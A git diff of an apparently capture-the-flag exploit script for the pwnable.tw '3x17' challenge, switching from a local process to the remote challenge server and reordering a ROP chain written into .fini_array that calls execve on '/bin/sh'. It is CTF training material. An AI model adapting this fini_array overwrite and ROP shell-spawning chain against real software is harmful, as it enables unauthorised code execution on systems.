@@ -8,7 +8,8 @@ exe = ELF("./3x17")
 context.binary = exe
 
 
-r = process([exe.path])
+#r = process([exe.path])
+r = remote("chall.pwnable.tw", 10105)
 
 #gdb.attach(r, gdbscript='''
 #	b*0x402960
@@ -37,9 +38,11 @@ def my_write(addr, data):
 	r.sendlineafter(b'data:', data)
 ## Stage 1
 my_write(fini_array, p64(sub_402960)+p64(main))
-my_write(fini_array+3*8, p64(pop_rdi)+p64(fini_array+11*8)+p64(pop_rsi))
-my_write(fini_array+6*8, p64(0)+p64(pop_rdx)+p64(0))
-my_write(fini_array+9*8, p64(ret)+p64(syscall)+b"/bin/sh\x00")
+my_write(fini_array+3*8, p64(pop_rdi)+p64(fini_array+11*8))
+my_write(fini_array+5*8, p64(pop_rsi)+p64(0))
+my_write(fini_array+7*8, p64(pop_rdx)+p64(0))
+my_write(fini_array+9*8, p64(ret)+p64(syscall))
+my_write(fini_array+11*8, b"/bin/sh\x00")
 
 ## Stage 2
 my_write(fini_array, p64(leave_ret)+p64(pop_rax)+p64(59))
